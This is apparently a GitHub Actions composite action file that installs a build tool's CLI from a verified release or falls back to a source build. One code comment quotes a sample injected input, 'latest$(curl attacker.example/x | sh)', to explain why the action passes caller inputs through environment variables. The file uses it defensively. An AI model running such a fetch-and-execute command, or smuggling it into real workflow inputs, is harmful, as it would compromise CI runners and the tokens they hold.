name: Setup reprobuild (install the repro CLI)
description: >
  Put the `repro` CLI on PATH, preferring the prebuilt binary from a GitHub
  Release and falling back to a source build only when no verified asset exists
  for the running platform.

  Resolution order:
    -. A caller-built Nix package (repro-package) -> admit it if it is the
        pinned flake's own package output, add its bin/ to PATH, build nothing.
    0. Explicit from-source=true -> build the requested source revision.
    1. The requested prebuilt release archive for this OS/arch -> download, verify its
        SHA-256 against the release's SHA256SUMS, unpack, add bin/ to PATH.
    2. Source build -- Nix dev shell on Linux/macOS, env.ps1 DIY contract on
        Windows. Announced with a ::warning:: rather than taken silently, because
        it is minutes-to-hours slower. Only this source path invokes the
        canonical `reprobuild-provision` dependency action, after cloning the
        selected Reprobuild source and before compiling it. Verified release
        installation does not clone or build SDK source dependencies.

  Step 1 is the reason release archives are published at all. It did not exist
  until now: this action probed PATH and otherwise went straight to a source
  build, so the release assets were never downloaded by anything.

  WHY THIS ACTION LIVES HERE AND NOT IN `reprobuild`. It used to, and a job
  that merely `uses:` it had to download the whole 546 MB reprobuild
  repository archive during `Set up job` — inside the runner's fixed
  100-second per-action HttpClient.Timeout, and before any `if:` could decide
  the action was not needed. See the block above the two `uses:` in
  `setup-dev-env/action.yml` for the measurements. Hosting it in this 186 KB
  repo costs no extra download at all, because every consumer is already
  fetching this repo to read `setup-dev-env`.

  `install-release.sh` comes along via the `github.action_path` context.
  Only the source constructor clones the Reprobuild worktree and provisions
  its build dependencies. Source dependency overrides retain their existing
  defaults; this sequencing change does not introduce lock-derived selection.

  Name that context in prose only, as `github.action_path`. Do NOT write it in
  the double-brace expression form anywhere in this field: GitHub's
  action-manifest parser EVALUATES expressions inside `description:`, against a
  context that has no `github`. Written that way it is not a quotation, it is a
  template error, and it fails every consumer's `Set up job` before its first
  step with

    Unrecognized named-value: 'github'. Located at position 1 within
    expression: github.action_path

  which is how this was found: on the run that confirmed the 546 MB archive had
  left the critical path.

inputs:
  consumer-directory:
    description: Relative consumer checkout under the physical GitHub workspace.
    required: false
    default: "."
  workspace-directory:
    description: Relative containing SDK workspace for source dependencies.
    required: false
    default: "."
  gh-token:
    description: GitHub token (CI App token) for cloning private metacraft-labs repos and Nix flake inputs.
    required: false
    default: ""
  substituters:
    description: Space-separated Nix substituter URLs to trust in addition to cache.nixos.org.
    required: false
    default: ""
  trusted-public-keys:
    description: Space-separated signing public keys for the extra Nix substituters.
    required: false
    default: ""
  attic-token:
    description: Attic token used to upload newly built store paths.
    required: false
    default: ""
  attic-cache:
    description: Attic cache name to upload newly built store paths to.
    required: false
    default: ""
  attic-endpoint:
    description: Attic server endpoint.
    required: false
    default: "https://cache.metacraft-labs.com/"
  repro-version:
    description: >
      Release to install the prebuilt `repro` CLI from -- a tag (`v0.2.0`, or
      the bare `0.2.0`) or `latest`. Pin this to make a consumer's CI
      reproducible across reprobuild releases. Ignored when `from-source` is
      true. An unrelated CLI on PATH never overrides this selection.
    required: false
    default: "latest"
  io-mon-pin:
    description: Optional full io-mon source SHA for a Linux/macOS source build; empty retains the Reprobuild flake lock.
    required: false
    default: ""
  sibling-owner:
    description: >
      GitHub owner(s) forwarded to the source dependency provisioner
      (`reprobuild-provision`'s input of the same name). A whitespace-separated
      list is accepted: the FIRST word is the owner the siblings are cloned
      from, and the provisioner's credential is scoped to every listed owner.
    required: false
    default: "metacraft-labs"
  runquota-ref:
    description: RunQuota source ref for a source build; empty takes the revision the reprobuild at repro-build-pin locks in its flake.lock.
    required: false
    default: ""
  io-mon-ref:
    description: Windows io-mon source ref; empty takes the revision the reprobuild at repro-build-pin locks. The separate io-mon-pin selects the POSIX Nix override.
    required: false
    default: ""
  stackable-hooks-pin:
    description: Optional full lowercase Windows hook-library SHA; empty takes the revision the reprobuild at repro-build-pin locks.
    required: false
    default: ""
  from-source:
    description: >
      Build the CLI from source, overriding a CLI already on PATH. For
      testing an unreleased reprobuild change, or a platform whose release
      archive is known-bad. Pair with `repro-build-pin` to choose the ref.
    required: false
    default: "false"
  repro-package:
    description: >
      Nix store path of a `reprobuild` package the caller already built from
      `github:metacraft-labs/reprobuild/<repro-build-pin>` (Linux and macOS).
      When set, no release is installed and nothing is built: the path must
      be valid in the local store and equal to the package output that pinned
      flake evaluates to on this system, which requires repro-build-pin to be
      a full commit SHA; its bin/ then goes on PATH. A workflow that builds
      the package for its own identity receipts passes it here so the job
      does not build the engine a second time. Overrides from-source.
    required: false
    default: ""
  require-checksum:
    description: >
      Refuse to install a release archive that cannot be checked against the
      SHA256SUMS the release publishes; fall back to a source build instead.
      Leave this true -- only the literal string `false` turns it off, so a
      typo fails closed rather than silently installing unverified.

      Scope, stated plainly so nobody mistakes it for more than it is:
      SHA256SUMS is served from the same origin as the archive, so this is an
      INTEGRITY check (truncation, a bad mirror, a half-uploaded asset), not a
      trust root. It does not authenticate the publisher; an attacker who can
      serve the release can serve a matching SHA256SUMS. Authenticity needs
      signing (cosign / GitHub artifact attestations) and is a separate change.
      Setting this false drops even the integrity check, leaving TLS alone --
      needed only for releases v0.1.0..v0.1.3, which predate checksum
      publication.
    required: false
    default: "true"
  repro-build-pin:
    description: >
      Git ref (branch, tag, or SHA) of `metacraft-labs/reprobuild` to build the
      `repro` CLI from when the SOURCE fallback is used. Empty (the default)
      builds the release tag the prebuilt path resolved from `repro-version`,
      so a platform without a prebuilt asset runs the same reprobuild as the
      others; when no release was resolved (`from-source: true`, or the lookup
      failed) it builds `dev`. This does not affect which release the prebuilt
      path installs -- that is `repro-version`.
    required: false
    default: ""

outputs:
  install-source:
    description: >
      How `repro` ended up on PATH: `release` (verified prebuilt archive),
      `package` (the caller's repro-package) or `source` (built here).
      Useful for asserting in CI that a given runner class is actually being
      served by a prebuilt binary.
    value: ${{ steps.decide.outputs.install-source }}
  repro-bin-dir:
    description: Directory added to PATH containing the selected `repro` CLI.
    value: ${{ steps.decide.outputs.repro-bin-dir }}

runs:
  using: composite
  steps:
    - name: Resolve explicit checkout and SDK roots
      id: roots
      shell: bash
      env:
        MCL_CONSUMER_DIRECTORY: ${{ inputs.consumer-directory }}
        MCL_WORKSPACE_DIRECTORY: ${{ inputs.workspace-directory }}
      run: |
        . "${GITHUB_ACTION_PATH}/../ci-roots/route.sh"
        printf 'workspace-directory=%s\nlegacy-layout=%s\n' "$MCL_WORKSPACE_ROOT" "$MCL_LEGACY_LAYOUT" >> "$GITHUB_OUTPUT"
    # PATH discovery is not release identity: an older or incomplete installation
    # must not suppress the explicitly requested SDK. Reuse requires the owning
    # store/release provenance, not a successful --version string. Until that
    # authority is supplied, use the canonical verified installer below.

    # ── Preferred path: the prebuilt release binary ───────────────────────────
    #
    # install-release.sh exits 3 (not 1) when this platform simply has no
    # verified asset in the target release. That is a routine state -- e.g. a
    # release cut without a windows-aarch64 leg -- and it means "fall back",
    # whereas exit 1 (checksum mismatch, corrupt archive, unusable binary) is a
    # real failure that must NOT be papered over by silently building from
    # source. Only exit 3 is caught here.
    # ── Caller-built package: admit it and build nothing ─────────────────────
    - name: Use the caller's prebuilt repro package
      id: package
      if: ${{ inputs.repro-package != '' }}
      shell: bash
      env:
        REPRO_PACKAGE: ${{ inputs.repro-package }}
        REPRO_BUILD_PIN: ${{ inputs.repro-build-pin }}
        GH_TOKEN: ${{ inputs.gh-token }}
      run: |
        bash "${GITHUB_ACTION_PATH}/bind-repro-package.sh"

    - name: Install prebuilt repro CLI from GitHub Release
      id: release
      if: ${{ inputs.from-source != 'true' && inputs.repro-package == '' }}
      shell: bash
      env:
        REPRO_VERSION: ${{ inputs.repro-version }}
        REPRO_REQUIRE_CHECKSUM: ${{ inputs.require-checksum }}
        # Only used to authenticate the `latest` lookup against api.github.com.
        # Anonymous API access is 60 requests/hour PER IP and the whole
        # ephemeral-runner fleet egresses from one address, so without a token
        # `repro-version: latest` starts 403ing under ordinary load -- which
        # this action reads as "cannot resolve latest" and turns into a silent,
        # much slower source build.
        REPRO_GITHUB_TOKEN: ${{ inputs.gh-token }}
        MCL_WORKSPACE_ROOT: ${{ steps.roots.outputs.workspace-directory }}
        MCL_LEGACY_LAYOUT: ${{ steps.roots.outputs.legacy-layout }}
      run: |
        set -uo pipefail
        install_dir="${RUNNER_TEMP}/reprobuild-release"
        set +e
        output="$(REPRO_INSTALL_DIR="${install_dir}" \
          bash "${{ github.action_path }}/install-release.sh")"
        rc=$?
        set -e

        # The release this run resolved, whether or not an asset existed for
        # this platform. The source fallback builds this tag by default, so a
        # platform without a prebuilt (linux-aarch64) runs the same reprobuild
        # as every other leg rather than a branch tip that may not read the
        # consumer's lock schema.
        #
        # Parsed with bash builtins only, keeping the last match. This step's
        # PATH is the job's, and on self-hosted runners that is a Nix profile
        # without coreutils or sed: install-release.sh appends the system
        # directories to its own PATH, but that does not reach this script, so
        # `sed` or `tail` here fails with exit 127 after a good install.
        resolved_tag=""
        while IFS= read -r line; do
          if [[ ${line} == REPRO_RESOLVED_TAG=* ]]; then
            resolved_tag="${line#REPRO_RESOLVED_TAG=}"
          fi
        done <<< "${output}"
        # It comes from the GitHub API and becomes a git ref: accept only a
        # release-tag shape.
        case "${resolved_tag}" in
          v[0-9]*) case "${resolved_tag}" in *[!A-Za-z0-9._-]*) resolved_tag="" ;; esac ;;
          *) resolved_tag="" ;;
        esac

        if [ "${rc}" -eq 0 ]; then
          bin_dir="${output##*REPRO_BIN_DIR=}"
          echo "resolved-tag=${resolved_tag}" >> "$GITHUB_OUTPUT"
          echo "installed=true" >> "$GITHUB_OUTPUT"
          echo "bin-dir=${bin_dir}" >> "$GITHUB_OUTPUT"
          echo "${bin_dir}" >> "$GITHUB_PATH"
        elif [ "${rc}" -eq 3 ]; then
          # Expected "no prebuilt available here" -- the reason was printed to
          # stderr by the script. The loud announcement happens in `decide`.
          # An integrity failure (any other exit) writes no outputs at all.
          echo "resolved-tag=${resolved_tag}" >> "$GITHUB_OUTPUT"
          echo "installed=false" >> "$GITHUB_OUTPUT"
        else
          echo "::error::setup-reprobuild: installing the prebuilt repro CLI failed (exit ${rc}). Not falling back to a source build -- see the error above."
          exit "${rc}"
        fi

    # Single place that decides whether the source build runs, so the condition
    # is not repeated (and mis-repeated) across five steps.
    - name: Decide install path
      id: decide
      shell: bash
      # Caller-supplied inputs arrive through `env`, never through `${{ }}`
      # inside the script body. A `${{ }}` expression is textually pasted into
      # the script before bash parses it, so a caller passing
      #   repro-version: latest$(curl attacker.example/x | sh)
      # would have had that command substitution EXECUTED by the ::warning::
      # line below -- with this action's job token in scope. `setup-dev-env`
      # forwards these from ~20 repos, some of which wire them to
      # workflow_dispatch inputs, so they are not trusted constants.
      env:
        FROM_SOURCE: ${{ inputs.from-source }}
        REPRO_VERSION: ${{ inputs.repro-version }}
        REPRO_BUILD_PIN: ${{ inputs.repro-build-pin }}
        RESOLVED_TAG: ${{ steps.release.outputs.resolved-tag }}
        RELEASE_INSTALLED: ${{ steps.release.outputs.installed }}
        RELEASE_BIN_DIR: ${{ steps.release.outputs.bin-dir }}
        REPRO_PACKAGE: ${{ inputs.repro-package }}
        PACKAGE_BIN_DIR: ${{ steps.package.outputs.bin-dir }}
        MCL_WORKSPACE_ROOT: ${{ steps.roots.outputs.workspace-directory }}
        MCL_LEGACY_LAYOUT: ${{ steps.roots.outputs.legacy-layout }}
      run: |
        set -euo pipefail
        build_ref="${REPRO_BUILD_PIN:-${RESOLVED_TAG:-dev}}"
        if [ -n "${REPRO_PACKAGE:-}" ]; then
          if [ -z "${PACKAGE_BIN_DIR:-}" ]; then
            echo "::error::setup-reprobuild: repro-package was given but not admitted"
            exit 1
          fi
          echo "install-source=package" >> "$GITHUB_OUTPUT"
          echo "repro-bin-dir=${PACKAGE_BIN_DIR}" >> "$GITHUB_OUTPUT"
          echo "need-source=false"      >> "$GITHUB_OUTPUT"
        elif [ "${RELEASE_INSTALLED}" = "true" ]; then
          echo "install-source=release" >> "$GITHUB_OUTPUT"
          echo "repro-bin-dir=${RELEASE_BIN_DIR}" >> "$GITHUB_OUTPUT"
          echo "need-source=false"      >> "$GITHUB_OUTPUT"
        else
          # Announce the fallback. A source build is minutes-to-hours slower and
          # pulls in the whole Nix/env.ps1 toolchain, so a consumer silently
          # dropping into it -- which is what happened on EVERY runner before
          # this action learned to use releases -- should be visible, not
          # inferred from a long job time.
          if [ "${FROM_SOURCE}" = "true" ]; then
            echo "::notice::setup-reprobuild: building repro from source because from-source=true (ref: ${build_ref})."
          else
            echo "::warning::setup-reprobuild: no verified prebuilt repro release for this platform (requested: ${REPRO_VERSION}); FALLING BACK to a source build of '${build_ref}'. See the preceding log lines for why. This is much slower and requires the sibling repos provisioned by reprobuild-provision."
          fi
          echo "install-source=source"  >> "$GITHUB_OUTPUT"
          echo "repro-bin-dir="         >> "$GITHUB_OUTPUT"
          echo "need-source=true"       >> "$GITHUB_OUTPUT"
        fi

    # ── Fallback path: build from source (unchanged behaviour) ────────────────

    - name: Clone reprobuild source
      if: ${{ steps.decide.outputs.need-source == 'true' }}
      shell: bash
      env:
        REPRO_BUILD_PIN: ${{ inputs.repro-build-pin }}
        RESOLVED_TAG: ${{ steps.release.outputs.resolved-tag }}
        GH_TOKEN: ${{ inputs.gh-token }}
        GIT_AUTH_DIR: ${{ github.action_path }}/../git-auth
        MCL_WORKSPACE_ROOT: ${{ steps.roots.outputs.workspace-directory }}
        MCL_LEGACY_LAYOUT: ${{ steps.roots.outputs.legacy-layout }}
      run: |
        # Reprobuild's CI matrix builds `repro` on every push, so the
        # default-branch tip is always a known-good source tree. Honour an
        # optional pin so repos can lock reprobuild to a known SHA across runs.
        #
        # THIS GOES THROUGH `authenticated-clone.sh` and not a bare `git clone`.
        # `metacraft-labs/reprobuild` is PUBLIC, and git does not send a URL's
        # credential to a repository that never answers 401 -- so a plain clone
        # here is anonymous, and anonymous github.com traffic is rate-limited
        # per IP across this org's whole ephemeral-runner fleet. It is a 546 MB
        # repository, which makes it the single worst clone in this repo to be
        # doing on the shared anonymous budget. See
        # `reprobuild-provision/provision-reprobuild-siblings.sh` for the full
        # account of the same defect on the sibling path.
        #
        # The previous shape also sent the first attempt's stderr to
        # /dev/null, so the rate-limit message -- the one line that says what
        # actually went wrong -- was discarded, and the fallback then failed
        # with no explanation at all. `authenticated-clone.sh` prints git's own
        # output, scrubbed, naming the repository.
        set -uo pipefail
        # An explicit pin wins; otherwise the release this run resolved, so the
        # fallback builds what the other platforms install; `dev` only when no
        # release was resolved.
        REF="${REPRO_BUILD_PIN:-${RESOLVED_TAG:-dev}}"
        DEST="${MCL_WORKSPACE_ROOT}/.reprobuild-src"
        . "${GIT_AUTH_DIR}/scoped-git-auth.sh"
        export TOKEN_OWNERS="metacraft-labs"
        export SCOPED_GIT_AUTH_MASK=1
        scoped_git_auth_build || exit 1
        scoped_git_auth_export
        scoped_git_auth_report
        bash "${GIT_AUTH_DIR}/authenticated-clone.sh" \
          --repo metacraft-labs/reprobuild --dest "${DEST}" --rev "${REF}" --shallow

    # SDK source dependencies belong to the selected source constructor, not
    # to every caller that might receive a verified release instead. The
    # provisioner reads the cloned reprobuild's flake.lock, so each sibling it
    # clones defaults to the revision repro-build-pin locks, not a mainline.
    - name: Provision selected Reprobuild source dependencies
      if: ${{ steps.decide.outputs.need-source == 'true' }}
      uses: metacraft-labs/metacraft-github-actions/reprobuild-provision@a8fe10f2993753adee0afa23789cbfefd88d0403
      with:
        consumer-directory: ${{ inputs.consumer-directory }}
        workspace-directory: ${{ inputs.workspace-directory }}
        gh-token: ${{ inputs.gh-token }}
        sibling-owner: ${{ inputs.sibling-owner }}
        reprobuild-source-directory: ${{ steps.roots.outputs.workspace-directory }}/.reprobuild-src
        runquota-ref: ${{ inputs.runquota-ref }}
        io-mon-ref: ${{ inputs.io-mon-ref }}
        stackable-hooks-pin: ${{ inputs.stackable-hooks-pin }}

    - name: Install Nix (Linux/macOS, to build repro)
      if: ${{ steps.decide.outputs.need-source == 'true' && runner.os != 'Windows' }}
      uses: metacraft-labs/metacraft-github-actions/setup-nix@dev
      with:
        gh-token: ${{ inputs.gh-token }}
        substituters: ${{ inputs.substituters }}
        trusted-public-keys: ${{ inputs.trusted-public-keys }}
        attic-token: ${{ inputs.attic-token }}
        attic-cache: ${{ inputs.attic-cache }}
        attic-endpoint: ${{ inputs.attic-endpoint }}

    - name: Build repro CLI (Linux/macOS)
      if: ${{ steps.decide.outputs.need-source == 'true' && runner.os != 'Windows' }}
      shell: bash
      env:
        IO_MON_PIN: ${{ inputs.io-mon-pin }}
        MCL_WORKSPACE_ROOT: ${{ steps.roots.outputs.workspace-directory }}
        MCL_LEGACY_LAYOUT: ${{ steps.roots.outputs.legacy-layout }}
      run: |
        set -euo pipefail
        cd "${MCL_WORKSPACE_ROOT}/.reprobuild-src"
        # Bash 3.2 treats an empty array as unset under nounset. Keep the
        # command itself in the array so the default path is nonempty too.
        nix_develop_args=(develop)
        if [ -n "${IO_MON_PIN}" ]; then
          if [[ ! "${IO_MON_PIN}" =~ ^[0-9a-f]{40}$ ]]; then
            echo "::error::io-mon-pin must be a full lowercase source SHA"
            exit 1
          fi
          nix_develop_args+=(--override-input io-mon-src "github:metacraft-labs/io-mon/${IO_MON_PIN}")
        fi
        # Use the dev shell's just target — the same path reprobuild's own CI
        # exercises — overriding the private flake inputs to the local clones
        # `reprobuild-provision` produced so Nix doesn't fetch them via tarball.
        # `reprobuild-provision` clones the recorder only for a reprobuild
        # whose lock still pins it (pre-v0.2.0), so override it only then.
        if [ -d "${MCL_WORKSPACE_ROOT}/codetracer-native-recorder/.git" ]; then
          nix_develop_args+=(--override-input codetracer-native-recorder "path:${MCL_WORKSPACE_ROOT}/codetracer-native-recorder")
        fi
        nix "${nix_develop_args[@]}" \
          --profile "${RUNNER_TEMP}/reprobuild-source-shell" \
          --override-input runquota-src "path:${MCL_WORKSPACE_ROOT}/runquota" \
          --command bash -c '
            set -euo pipefail
            just build
            : "${NIMCRYPTO_SRC:?reprobuild dev shell did not set NIMCRYPTO_SRC}"
            : "${BEARSSL_SRC:?reprobuild dev shell did not set BEARSSL_SRC}"
            : "${GITHUB_ENV:?GitHub Actions did not set GITHUB_ENV}"
            echo "NIMCRYPTO_SRC=${NIMCRYPTO_SRC}" >> "${GITHUB_ENV}"
            echo "BEARSSL_SRC=${BEARSSL_SRC}" >> "${GITHUB_ENV}"
            # Tool resolution also starts this helper outside the build shell.
            # Select the staged script with its pinned Python interpreter.
            # The profile above keeps that interpreter rooted for this job.
            helper="${PWD}/build/bin/reprobuild-nix-daemon"
            test -x "${helper}"
            "${helper}" --help >/dev/null
            echo "REPROBUILD_NIX_DAEMON_BIN=${helper}" >> "${GITHUB_ENV}"
            # Later job steps that run Python helpers (diagnostics, consumer
            # workflows) run outside this shell. Preserve the rooted
            # interpreter rather than assuming PATH has Python.
            # refresh-build-auth does not use it: it runs on the declared
            # Node runtime.
            bootstrap_python="$(command -v python3)"
            test -x "${bootstrap_python}"
            echo "REPROBUILD_BOOTSTRAP_PYTHON=${bootstrap_python}" >> "${GITHUB_ENV}"
            # macOS provider compilation needs the source shell compiler and
            # its SDK closure and a non-SIP executable. Linux keeps its host
            # compiler: a Nix-linked helper outside that shell can mix the
            # Nix loader with host glibc (source-bootstrap issue, 2026-09-29).
            if [ "$(uname -s)" = Darwin ]; then
              bootstrap_cc="$(command -v "${CC:-cc}")"
              test -x "${bootstrap_cc}"
              case "${bootstrap_cc}" in
                /nix/store/*/bin/*) ;;
                *) echo "Source bootstrap requires a Nix C compiler" >&2; exit 1 ;;
              esac
              echo "REPRO_BOOTSTRAP_CC=${bootstrap_cc}" >> "${GITHUB_ENV}"
            fi
            # Monitored launches on macOS cannot use SIP-protected /bin shells.
            # Keep its rooted Bash available in subsequent steps.
            bootstrap_bash="$(command -v bash)"
            test -x "${bootstrap_bash}"
            if [ "$(uname -s)" = Darwin ]; then
              case "${bootstrap_bash}" in
                /nix/store/*/bin/bash) ;;
                *) echo "Source bootstrap requires Nix Bash on macOS" >&2; exit 1 ;;
              esac
            fi
            echo "${bootstrap_bash%/*}" >> "${GITHUB_PATH}"
            echo "REPRO_FOREIGN_ENV_BASH=${bootstrap_bash}" >> "${GITHUB_ENV}"
            # The source shell already provides its pinned RunQuota package.
            # Later repro commands run outside that shell and still need the
            # daemon for lease admission, including when building RunQuota itself.
            # Keep the rooted executable discoverable across workflow steps.
            runquotad="$(command -v runquotad)"
            test -x "${runquotad}"
            "${runquotad}" --version
            echo "RUNQUOTAD_BIN=${runquotad}" >> "${GITHUB_ENV}"
            # `repro` dlopens solver/cache libraries by leaf name. On Linux
            # scripts/build_apps.sh links an rpath for each of them, gated by
            # reprobuild tests/integration/t_repro_runtime_dlopen_without_library_path.nim,
            # so the CLI needs no loader variable. Do not persist the build
            # shell LD_LIBRARY_PATH: every later step inherits it, including
            # the actions repro runs, and it makes a Nix tool from another
            # nixpkgs load that shell glibc-linked libraries. Measured on
            # gosti run 41220276392 (linux-x64): swtpm --version exited 1,
            # glibc-2.40 libc.so.6 lacks GLIBC_ABI_DT_X86_64_PLT required by
            # glibc-2.42 libdl.so.2. macOS keeps both paths as before.
            if [ "$(uname -s)" = "Darwin" ]; then
              if [ -n "${LD_LIBRARY_PATH:-}" ]; then
                echo "LD_LIBRARY_PATH=${LD_LIBRARY_PATH}" >> "${GITHUB_ENV}"
              fi
              dyld_library_path="${DYLD_LIBRARY_PATH:-${LD_LIBRARY_PATH:-}}"
              if [ -n "${dyld_library_path}" ]; then
                echo "DYLD_LIBRARY_PATH=${dyld_library_path}" >> "${GITHUB_ENV}"
              fi
            fi
          '
        # `just build` writes to ./build/bin/repro. Surface it on PATH.
        echo "${PWD}/build/bin" >> "$GITHUB_PATH"

    - name: Prepare selected reprobuild source (Windows)
      if: ${{ steps.decide.outputs.need-source == 'true' && runner.os == 'Windows' }}
      shell: bash
      env:
        MCL_WORKSPACE_ROOT: ${{ steps.roots.outputs.workspace-directory }}
        MCL_LEGACY_LAYOUT: ${{ steps.roots.outputs.legacy-layout }}
      run: |
        set -euo pipefail
        # Keep the selected SDK clone distinct from a consumer named reprobuild.
        # It already shares the workspace parent with its provisioned siblings.
        source="${MCL_WORKSPACE_ROOT}/.reprobuild-src"
        # Git for Windows may check text files out with CRLF. This file's lines
        # become Nim source paths during `just build`, so strip CRs first.
        entrypoints="${source}/apps/entrypoints.txt"
        if [ -f "${entrypoints}" ]; then
          sed -i 's/\r$//' "${entrypoints}"
        fi

    - name: Build repro CLI (Windows)
      if: ${{ steps.decide.outputs.need-source == 'true' && runner.os == 'Windows' }}
      shell: pwsh
      env:
        MCL_WORKSPACE_ROOT: ${{ steps.roots.outputs.workspace-directory }}
        MCL_LEGACY_LAYOUT: ${{ steps.roots.outputs.legacy-layout }}
      run: |
        # Windows-side: replay reprobuild's own DIY contract. Source its env.ps1
        # (which pulls in the toolchain managed by windows/bootstrap-toolchain.ps1)
        # and compile the apps via scripts/build_apps.sh. The build drops
        # `repro.exe` under build\bin\ which we add to GITHUB_PATH.
        Set-Location "$env:MCL_WORKSPACE_ROOT\.reprobuild-src"
        $initialEnv = @{}
        Get-ChildItem env: | ForEach-Object { $initialEnv[$_.Name] = $_.Value }
        . .\env.ps1
        # Reprobuild needs its lease authority before it can build a consumer.
        # Keep this bootstrap binary outside consumer outputs, including when
        # the consumer is RunQuota and its tests rebuild their own daemon.
        & "$env:GITHUB_ACTION_PATH/build-runquota-bootstrap.ps1"
        if (Get-Command just -ErrorAction SilentlyContinue) {
          just build
        } else {
          bash ./scripts/build_apps.sh
        }
        if ($LASTEXITCODE -ne 0) {
          throw "reprobuild compilation failed with exit code $LASTEXITCODE"
        }
        # Monitored actions use a tool-specific PATH. Repro's monitor driver
        # must load its DLLs from its own directory in those subprocesses.
        & ./windows/stage-release-dlls.ps1
        # Surface newly added toolchain PATH entries (nim, gcc, clingo, openssl, bash, repro)
        # to subsequent workflow steps.
        $initialPaths = if ($initialEnv.ContainsKey("PATH")) { $initialEnv["PATH"] -split ';' } else { @() }
        $currentPaths = $env:PATH -split ';'
        $newPaths = @()
        foreach ($p in $currentPaths) {
          if (-not [string]::IsNullOrWhiteSpace($p) -and -not ($initialPaths -contains $p) -and -not ($newPaths -contains $p)) {
            $newPaths += $p
          }
        }
        foreach ($p in $newPaths) {
          if (Test-Path -LiteralPath $p) {
            Add-Content -Path $env:GITHUB_PATH -Value (Resolve-Path -LiteralPath $p).Path
          }
        }
        # Also ensure reprobuild's build\bin is explicitly on PATH
        $reproBin = (Resolve-Path .\build\bin).Path
        if (-not ($newPaths -contains $reproBin)) {
          Add-Content -Path $env:GITHUB_PATH -Value $reproBin
        }
        # Explicitly export compiler pins for repro's extract_runner and provider compiles
        $nimCmd = Get-Command nim.exe -ErrorAction SilentlyContinue
        if ($nimCmd) {
          Add-Content -Path $env:GITHUB_ENV -Value "REPRO_NIM_COMPILER=$($nimCmd.Source)"
        }
        $gccCmd = Get-Command gcc.exe -ErrorAction SilentlyContinue
        if ($gccCmd) {
          Add-Content -Path $env:GITHUB_ENV -Value "REPRO_BOOTSTRAP_CC=$($gccCmd.Source)"
        }
        # Propagate environment variables exported by env.ps1 (LIBRARY_PATH, BEARSSL_SRC, etc.)
        Get-ChildItem env: | ForEach-Object {
          if (-not $initialEnv.ContainsKey($_.Name) -or $initialEnv[$_.Name] -ne $_.Value) {
            if ($_.Name -notin @("PATH", "PWD", "OLDPWD", "REPRO_NIM_COMPILER", "REPRO_BOOTSTRAP_CC")) {
              Add-Content -Path $env:GITHUB_ENV -Value "$($_.Name)=$($_.Value)"
            }
          }
        }
        # Ensure siblings cloned under GITHUB_WORKSPACE are also accessible from the parent directory
        # (where consumer repro.nim files with ../<sibling> relative imports expect them).
        $ws = $env:MCL_WORKSPACE_ROOT
        $parentWs = Split-Path -Parent $ws
        if ($env:MCL_LEGACY_LAYOUT -eq "true" -and $parentWs -and (Test-Path -LiteralPath $parentWs)) {
          Get-ChildItem -Path $ws -Directory | ForEach-Object {
            $siblingName = $_.Name
            $target = $_.FullName
            $junctionPath = Join-Path $parentWs $siblingName
            if (-not (Test-Path -LiteralPath $junctionPath)) {
              New-Item -ItemType Junction -Path $junctionPath -Target $target -ErrorAction SilentlyContinue | Out-Null
            }
          }
        }
